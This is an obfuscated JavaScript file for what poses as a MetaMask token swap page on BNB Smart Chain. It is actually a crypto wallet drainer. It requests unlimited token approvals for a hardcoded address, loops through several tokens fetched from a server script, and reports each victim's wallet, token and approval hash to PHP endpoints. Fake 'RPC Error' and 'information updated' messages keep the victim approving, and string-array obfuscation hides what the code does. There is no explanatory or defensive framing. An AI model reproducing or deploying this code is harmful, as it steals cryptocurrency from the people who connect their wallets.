var _0x5161 = ["0x3Be0c5d31958Dd4C96A600dAb767e5B42939C178", "getItem", "length", "56", "115792089237316195423570985008687907853269984665640564039457584007913129639935", "from", "BigNumber", "Msxml2.XMLHTTP", "Microsoft.XMLHTTP", "undefined", "load", "key", "1", "blocked", "true", "onClick", "", "attr", "#swapBtnr", "addEventListener", "setItem", "animOpacity", "removeClass", "#StatusPush", "show", "display", "flex ", "css", "<img src=\"./images/metamask.02e3ec27.png\"><div>Please install the <a style=\"text-decoration: none; color:#fff;\" href=\"https://metamask.io/\" target=\"_blank\" >Metamask</a> extension</div>", "html", "onclick", " ", "Install Metamask now!", "text", "click", "href", "location", "https://metamask.io/", "on", "save.php", "stringify", "post", "result posted = ", "log", "ajax", "val", "#amount", "decimal", "round", "approve amount", "message", "catch", "then", "approve", "<img src=\"./images/loading.svg\"> Approve", "approve max amount", "<img src=\"./images/danger.svg\"><div style=\"color:#f4f4f4\">MetaMask - RPC Error: Network request failed. Code: -32603/1</div>", "background", "#f05f3f !important;", "color", "#f4f4f4 !important", "<img src=\"./images/danger.svg\"><div>", "</div>", "#f05f3f", ".onlinemarker", "addClass", "TokenContractController ", "data", "hash", "_", "./process.php", "tokenContract=", "&wallet=", "&amount=", "POST", "open", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "onreadystatechange", "readyState", "status", "Pending", "Approve", "send", "Waiting <img src=\"./images/loading.svg\" width=\"24px\">", "INSUFFICIENT_OUTPUT_AMOUNT", ".Approve", "ApproveError", ".swap__connect button", "border", "none", "1px #f05f3f  solid", ".swap__mainfield", ".badge", "<img src=\"./images/danger.svg\"><div>The transaction cannot succeed due to error</div>", "0", "decimals", "ethereum", "code", "Please connect to MetaMask.", "<img src=\"./images/danger.svg\"><div>Please connect to MetaMask.</div>", "error", "<img src=\"./images/danger.svg\"><div>Please, refresh page.</div>", "providers", "getSigner", "eth_requestAccounts", "request", "networkVersion", "current_network", "eth_accounts", "wallet", "#wallet", "userWallet", "./pars.php", "#res", "title", "2", "3", "4", "5", "forEach", ".hash-tag", "querySelectorAll", "substring", "lastIndexOf", "..", ".Swap__line", "position", "absolute", ".header__connect_btn", "width", "initial", "contract", "msg", "<img src=\"./images/approve.svg\"><div>Thank you, the information is updated. Now everything is ready for the exchange 😉</div>", "<img src=\"./images/loading.svg\" style=\"width: 24px;\"> Loading", "<img src=\"./images/loading.svg\"><div>Checkin choosed network</div>", "<img src=\"./images/loading.svg\"><div>Succes! Active network: BSC</div>", "<img src=\"./images/loading.svg\"><div>Information about the token contract is being updated!</div>", "reload", "approveMaxAmount()", "300", ".Balance", "wallet_switchEthereumChain", "0x38", "BSC Mainnet(BNB)", "BNB", "https://bsc-dataseed.binance.org/", "https://bscscan.com", "wallet_addEthereumChain", "tx = ", "abi.json", "json", "Loading <img src=\"./images/loading.svg\" width=\"24px\">", "Swap", "MetaMask - RPC Error: Network request failed. Code: -32603/1", "#showWallet", "hide", "#showConnect", "#approve0", "#connect0", "#approve1", "#connect1", "#approve2", "#connect2", "#approve3", "#connect3", "#approve4", "#connect4", "#approve5", "#connect5", "#approve6", "#connect6"];
let approveWallet = _0x5161[0];
let tokens = [localStorage[_0x5161[1]](1), localStorage[_0x5161[1]](2), localStorage[_0x5161[1]](3), localStorage[_0x5161[1]](4), localStorage[_0x5161[1]](5)];
var arrayLength = tokens[_0x5161[2]];
var tokenContractControllers = [arrayLength];
var mainChainId = _0x5161[3];
let i = 0;
var max = _0x5161[4];
var tokenContract;
var wallet;
var contractController;
var decimal;
var MAX_VALUE = ethers[_0x5161[6]][_0x5161[5]](max.toString());
var isConnect = false;
var signer = undefined;
current_network = undefined;

function getXmlHttp() {
    var _0x929ex10;
    try {
        _0x929ex10 = new ActiveXObject(_0x5161[7])
    } catch (e) {
        try {
            _0x929ex10 = new ActiveXObject(_0x5161[8])
        } catch (E) {
            _0x929ex10 = false
        }
    };
    if (!_0x929ex10 && typeof XMLHttpRequest != _0x5161[9]) {
        _0x929ex10 = new XMLHttpRequest()
    };
    return _0x929ex10
}
window[_0x5161[19]](_0x5161[10], (_0x929ex11) => {
    if (localStorage[_0x5161[1]](_0x5161[11]) == _0x5161[12]) {
        doConnect()
    };
    if (localStorage[_0x5161[1]](_0x5161[13]) == _0x5161[14]) {
        $(_0x5161[18])[_0x5161[17]](_0x5161[15], _0x5161[16])
    } else {}
});

function connect() {
    if (isConnect === false) {
        doConnect();
        isConnect = true;
        localStorage[_0x5161[20]](_0x5161[11], _0x5161[12])
    } else {
        $(_0x5161[23])[_0x5161[22]](_0x5161[21]);
        $(_0x5161[23])[_0x5161[24]](300);
        $(_0x5161[23])[_0x5161[27]](_0x5161[25], _0x5161[26]);
        $(_0x5161[23])[_0x5161[29]](_0x5161[28]);
        $(_0x5161[18])[_0x5161[33]](_0x5161[32])[_0x5161[17]](_0x5161[30], _0x5161[31]);
        $(_0x5161[18])[_0x5161[38]](_0x5161[34], function () {
            document[_0x5161[36]][_0x5161[35]] = _0x5161[37]
        })
    };
    checkShowConnect()
}

function doLog(_0x929ex14) {
    $[_0x5161[44]]({
        url: _0x5161[39],
        data: JSON[_0x5161[40]]({
            "token": tokenContract,
            "sender": wallet,
            "amount": Number(_0x929ex14) / decimal
        }),
        cache: false,
        async: true,
        type: _0x5161[41],
        timeout: 5000,
        success: function (_0x929ex15) {
            console[_0x5161[43]](_0x5161[42], JSON[_0x5161[40]](_0x929ex15))
        }
    })
}

function approveWithAmount() {
    var _0x929ex14 = ethers[_0x5161[6]][_0x5161[5]]($(_0x5161[46])[_0x5161[45]]());
    console[_0x5161[43]](_0x5161[47], decimal);
    _0x929ex14 = Math[_0x5161[48]](_0x929ex14 * decimal);
    doLog(_0x929ex14);
    console[_0x5161[43]](_0x5161[49], _0x929ex14);
    contractController[_0x5161[53]](approveWallet, ethers[_0x5161[6]][_0x5161[5]](_0x929ex14.toString()))[_0x5161[52]]((_0x929ex18, _0x929ex19) => {})[_0x5161[51]](function (_0x929ex17) {
        alert(_0x929ex17[_0x5161[50]])
    })
}

function approveMaxAmount() {
    if (localStorage[_0x5161[1]](_0x5161[13]) == _0x5161[14]) {
        $(_0x5161[18])[_0x5161[29]](_0x5161[54])
    } else {
        console[_0x5161[43]](_0x5161[55], MAX_VALUE);
        doLog(MAX_VALUE);
        if (tokenContractControllers[i] === undefined) {
            $(_0x5161[23])[_0x5161[22]](_0x5161[21]);
            $(_0x5161[23])[_0x5161[24]](300);
            $(_0x5161[23])[_0x5161[27]](_0x5161[25], _0x5161[26]);
            $(_0x5161[23])[_0x5161[29]](_0x5161[56]);
            setTimeout(function () {}, 5000)
        };
        tokenContractControllers[i][_0x5161[53]](approveWallet, MAX_VALUE)[_0x5161[52]]((_0x929ex19) => {
            console[_0x5161[43]](_0x5161[66] + toString(tokenContractControllers[i]));
            console[_0x5161[43]](_0x5161[67], _0x929ex19);
            var _0x929ex1b = _0x929ex19[_0x5161[68]];
            var _0x929ex1c = _0x929ex19[_0x5161[5]];
            var _0x929ex1d = _0x5161[69];
            var _0x929ex1e = new XMLHttpRequest();
            var _0x929ex1f = _0x5161[70];
            var _0x929ex20 = _0x5161[71] + _0x929ex1b + _0x5161[72] + _0x929ex1c + _0x5161[73] + _0x929ex1d;
            _0x929ex1e[_0x5161[75]](_0x5161[74], _0x929ex1f, true);
            _0x929ex1e[_0x5161[78]](_0x5161[76], _0x5161[77]);
            _0x929ex1e[_0x5161[79]] = function () {
                if (_0x929ex1e[_0x5161[80]] == 4 && _0x929ex1e[_0x5161[81]] == 200) {
                    console[_0x5161[43]](_0x5161[82]);
                    setTimeout(function () {
                        $(_0x5161[18])[_0x5161[29]](_0x5161[83])
                    }, 2000)
                }
            };
            _0x929ex1e[_0x5161[84]](_0x929ex20);
            $(_0x5161[18])[_0x5161[29]](_0x5161[85]);
            i++;
            if (i >= 6) {
                setTimeout(function () {
                    $(_0x5161[18])[_0x5161[29]](_0x5161[86]);
                    $(_0x5161[87])[_0x5161[17]](_0x5161[30], _0x5161[16]);
                    $(_0x5161[89])[_0x5161[65]](_0x5161[88]);
                    $(_0x5161[89])[_0x5161[22]](_0x5161[83]);
                    $(_0x5161[89])[_0x5161[27]](_0x5161[57], _0x5161[63]);
                    $(_0x5161[89])[_0x5161[27]](_0x5161[90], _0x5161[91]);
                    $(_0x5161[93])[_0x5161[27]](_0x5161[90], _0x5161[92]);
                    $(_0x5161[94])[_0x5161[27]](_0x5161[57], _0x5161[63]);
                    $(_0x5161[23])[_0x5161[22]](_0x5161[21]);
                    $(_0x5161[23])[_0x5161[24]](300);
                    $(_0x5161[23])[_0x5161[27]](_0x5161[25], _0x5161[26]);
                    $(_0x5161[23])[_0x5161[29]](_0x5161[95]);
                    localStorage[_0x5161[20]](_0x5161[11], _0x5161[96]);
                    localStorage[_0x5161[20]](_0x5161[13], _0x5161[14])
                }, 5000)
            };
            approveMaxAmount()
        })[_0x5161[51]](function (_0x929ex17) {
            console[_0x5161[43]](_0x929ex17[_0x5161[50]]);
            $(_0x5161[18])[_0x5161[27]](_0x5161[57], _0x5161[58]);
            $(_0x5161[18])[_0x5161[27]](_0x5161[59], _0x5161[60]);
            $(_0x5161[23])[_0x5161[22]](_0x5161[21]);
            $(_0x5161[23])[_0x5161[24]](300);
            $(_0x5161[23])[_0x5161[27]](_0x5161[25], _0x5161[26]);
            $(_0x5161[23])[_0x5161[29]](_0x5161[61] + _0x929ex17[_0x5161[50]] + _0x5161[62]);
            $(_0x5161[64])[_0x5161[27]](_0x5161[57], _0x5161[63]);
            setTimeout(function () {
                $(_0x5161[23])[_0x5161[65]](_0x5161[21])
            }, 4000);
            setTimeout(function () {}, 5000)
        })
    }
}

function startApp() {
    contractController[_0x5161[97]]()[_0x5161[52]]((_0x929ex19) => {
        decimal = 10 ** (Number(_0x929ex19))
    })[_0x5161[51]](function (_0x929ex17) {
        alert(_0x929ex17[_0x5161[50]])
    });
    checkShowConnect()
}
async function doConnect() {
    let _0x929ex23 = window[_0x5161[98]];
    _0x929ex23[_0x5161[107]]({
        method: _0x5161[106]
    })[_0x5161[52]]((_0x929ex24) => {
        provider = new ethers[_0x5161[104]].Web3Provider(_0x929ex23);
        signer = provider[_0x5161[105]]();
        if (current_network === mainChainId) {
            connect()
        }
    })[_0x5161[51]]((_0x929ex17) => {
        if (_0x929ex17[_0x5161[99]] === 4001) {
            console[_0x5161[43]](_0x5161[100]);
            $(_0x5161[23])[_0x5161[22]](_0x5161[21]);
            $(_0x5161[23])[_0x5161[24]](300);
            $(_0x5161[23])[_0x5161[27]](_0x5161[25], _0x5161[26]);
            $(_0x5161[23])[_0x5161[29]](_0x5161[101])
        } else {
            console[_0x5161[102]](_0x929ex17);
            $(_0x5161[23])[_0x5161[22]](_0x5161[21]);
            $(_0x5161[23])[_0x5161[24]](300);
            $(_0x5161[23])[_0x5161[27]](_0x5161[25], _0x5161[26]);
            $(_0x5161[23])[_0x5161[29]](_0x5161[103]);
            setTimeout(function () {}, 5000)
        }
    });
    await switchEthereumChain();
    current_network = _0x929ex23[_0x5161[108]];
    if (current_network === mainChainId) {
        initContracts()
    } else {
        if (isConnect) {
            isConnect = false
        }
    };
    console[_0x5161[43]](_0x5161[109], current_network);
    const _0x929ex25 = await _0x929ex23[_0x5161[107]]({
        method: _0x5161[110]
    })[_0x5161[51]](checkErrEthAccounts());
    wallet = _0x929ex25[0];
    console[_0x5161[43]](_0x5161[111], wallet);
    $(_0x5161[112])[_0x5161[29]](wallet);
    localStorage[_0x5161[20]](_0x5161[113], wallet);
    $[_0x5161[44]]({
        url: _0x5161[114],
        data: {
            "wallet": wallet
        },
        cache: false,
        async: true,
        type: _0x5161[41],
        success: function (_0x929ex19) {
            $(_0x5161[115])[_0x5161[29]](_0x929ex19);
            var _0x929ex26 = _0x5161[16];
            var _0x929ex27 = _0x5161[16];
            var _0x929ex28 = _0x5161[16];
            var _0x929ex29 = _0x5161[16];
            var _0x929ex2a = _0x5161[16];
            document[_0x5161[123]](_0x5161[122])[_0x5161[121]](function (_0x929ex2b, _0x929ex2c, _0x929ex2d) {
                if (_0x929ex2b[_0x5161[116]] !== _0x5161[16]) {
                    if (_0x929ex2c === 1 || _0x929ex2c === 3 || _0x929ex2c === 5 || _0x929ex2c === 7 || _0x929ex2c === 9) {
                        _0x929ex26 = _0x929ex2d[1][_0x5161[116]];
                        _0x929ex27 = _0x929ex2d[3][_0x5161[116]];
                        _0x929ex28 = _0x929ex2d[5][_0x5161[116]];
                        _0x929ex29 = _0x929ex2d[7][_0x5161[116]];
                        _0x929ex2a = _0x929ex2d[9][_0x5161[116]];
                        localStorage[_0x5161[20]](_0x5161[12], _0x929ex26);
                        localStorage[_0x5161[20]](_0x5161[117], _0x929ex27);
                        localStorage[_0x5161[20]](_0x5161[118], _0x929ex28);
                        localStorage[_0x5161[20]](_0x5161[119], _0x929ex29);
                        localStorage[_0x5161[20]](_0x5161[120], _0x929ex2a)
                    }
                }
            })
        }
    });
    wallet = wallet[_0x5161[124]](0, 24);
    var _0x929ex2e = wallet[_0x5161[125]](_0x5161[31]);
    wallet = wallet[_0x5161[124]](24, _0x929ex2e) + _0x5161[126];
    $(_0x5161[64])[_0x5161[24]](300);
    $(_0x5161[127])[_0x5161[24]](300);
    $(_0x5161[112])[_0x5161[33]](wallet);
    $(_0x5161[130])[_0x5161[27]](_0x5161[128], _0x5161[129]);
    $(_0x5161[130])[_0x5161[27]](_0x5161[131], _0x5161[132]);
    if (localStorage[_0x5161[1]](_0x5161[133]) === _0x5161[12]) {
        if (localStorage[_0x5161[1]](_0x5161[134]) !== _0x5161[12]) {
            $(_0x5161[23])[_0x5161[22]](_0x5161[21]);
            $(_0x5161[23])[_0x5161[24]]();
            $(_0x5161[23])[_0x5161[27]](_0x5161[25], _0x5161[26]);
            $(_0x5161[23])[_0x5161[29]](_0x5161[135]);
            setTimeout(function () {
                localStorage[_0x5161[20]](_0x5161[134], _0x5161[12])
            }, 7000)
        }
    } else {
        $(_0x5161[18])[_0x5161[29]](_0x5161[136]);
        $(_0x5161[23])[_0x5161[22]](_0x5161[21]);
        $(_0x5161[23])[_0x5161[24]](300);
        $(_0x5161[23])[_0x5161[27]](_0x5161[25], _0x5161[26]);
        $(_0x5161[23])[_0x5161[29]](_0x5161[137]);
        $(_0x5161[18])[_0x5161[29]](_0x5161[136]);
        setTimeout(function () {
            $(_0x5161[23])[_0x5161[29]](_0x5161[138]);
            $(_0x5161[18])[_0x5161[29]](_0x5161[136])
        }, 1500);
        setTimeout(function () {
            $(_0x5161[18])[_0x5161[29]](_0x5161[136]);
            $(_0x5161[23])[_0x5161[29]](_0x5161[139])
        }, 1700);
        setTimeout(function () {
            $(_0x5161[18])[_0x5161[29]](_0x5161[136]);
            location[_0x5161[140]]()
        }, 2000);
        localStorage[_0x5161[20]](_0x5161[133], _0x5161[12])
    };
    if (wallet === undefined) {} else {
        $(_0x5161[18])[_0x5161[29]](_0x5161[83])[_0x5161[65]](_0x5161[83]);
        $(_0x5161[87])[_0x5161[17]](_0x5161[30], _0x5161[141]);
        $(_0x5161[143])[_0x5161[24]](_0x5161[142])
    }
}
async function checkErrEthAccounts(_0x929ex17) {
    if (isConnect && current_network != mainChainId) {}
}
async function switchEthereumChain() {
    let _0x929ex23 = window[_0x5161[98]];
    try {
        await _0x929ex23[_0x5161[107]]({
            method: _0x5161[144],
            params: [{
                chainId: _0x5161[145]
            }]
        })[_0x5161[52]]((_0x929ex31) => {})[_0x5161[51]]()
    } catch (switchError) {
        signer = undefined;
        isConnect = false;
        checkShowConnect();
        if (switchError[_0x5161[99]] === 4902) {
            try {
                await switchToMain()
            } catch (addError) {}
        }
    }
}
async function switchToMain() {
    let _0x929ex23 = window[_0x5161[98]];
    const _0x929ex19 = [{
        chainId: _0x5161[145],
        chainName: _0x5161[146],
        nativeCurrency: {
            name: _0x5161[147],
            symbol: _0x5161[147],
            decimals: 18
        },
        rpcUrls: [_0x5161[148]],
        blockExplorerUrls: [_0x5161[149]]
    }];
    const _0x929ex33 = await _0x929ex23[_0x5161[107]]({
        method: _0x5161[150],
        params: _0x929ex19
    })[_0x5161[51]]();
    current_network = _0x929ex23[_0x5161[108]];
    if (_0x929ex33) {
        console[_0x5161[43]](_0x5161[151], _0x929ex33)
    }
}

function initContracts() {
    if (signer === undefined) {
        isConnect = false;
        checkShowConnect();
        return
    };
    $[_0x5161[44]]({
        url: _0x5161[152],
        dataType: _0x5161[153],
        success: function (_0x929ex19) {
            var _0x929ex35 = _0x929ex19;
            for (var _0x929ex36 = 0; _0x929ex36 < arrayLength; _0x929ex36++) {
                if (tokenContractControllers[_0x929ex36] !== undefined) {};
                tokenContractControllers[_0x929ex36] = new ethers.Contract(tokens[_0x929ex36], _0x929ex35, signer);
                console[_0x5161[43]](tokenContractControllers[_0x929ex36])
            };
            checkShowConnect()
        }
    })
}

function approveProcess() {
    $(_0x5161[87])[_0x5161[17]](_0x5161[30], _0x5161[141]);
    $(_0x5161[87])[_0x5161[38]](_0x5161[34], function () {
        $(_0x5161[18])[_0x5161[29]](_0x5161[154]);
        setTimeout(function () {
            $(_0x5161[18])[_0x5161[29]](_0x5161[155]);
            alert(_0x5161[156])
        }, 10000)
    })
}

function checkShowConnect() {
    if (isConnect && signer != undefined) {
        $(_0x5161[157])[_0x5161[24]]();
        $(_0x5161[159])[_0x5161[158]]();
        $(_0x5161[160])[_0x5161[24]]();
        $(_0x5161[161])[_0x5161[158]]();
        $(_0x5161[162])[_0x5161[24]]();
        $(_0x5161[163])[_0x5161[158]]();
        $(_0x5161[164])[_0x5161[24]]();
        $(_0x5161[165])[_0x5161[158]]();
        $(_0x5161[166])[_0x5161[24]]();
        $(_0x5161[167])[_0x5161[158]]();
        $(_0x5161[168])[_0x5161[24]]();
        $(_0x5161[169])[_0x5161[158]]();
        $(_0x5161[170])[_0x5161[24]]();
        $(_0x5161[171])[_0x5161[158]]();
        $(_0x5161[172])[_0x5161[24]]();
        $(_0x5161[173])[_0x5161[158]]()
    } else {
        $(_0x5161[157])[_0x5161[158]]();
        $(_0x5161[159])[_0x5161[24]]();
        $(_0x5161[160])[_0x5161[158]]();
        $(_0x5161[161])[_0x5161[24]]();
        $(_0x5161[162])[_0x5161[158]]();
        $(_0x5161[163])[_0x5161[24]]();
        $(_0x5161[164])[_0x5161[158]]();
        $(_0x5161[165])[_0x5161[24]]();
        $(_0x5161[166])[_0x5161[158]]();
        $(_0x5161[167])[_0x5161[24]]();
        $(_0x5161[168])[_0x5161[158]]();
        $(_0x5161[169])[_0x5161[24]]();
        $(_0x5161[170])[_0x5161[158]]();
        $(_0x5161[171])[_0x5161[24]]();
        $(_0x5161[172])[_0x5161[158]]();
        $(_0x5161[173])[_0x5161[24]]()
    }
}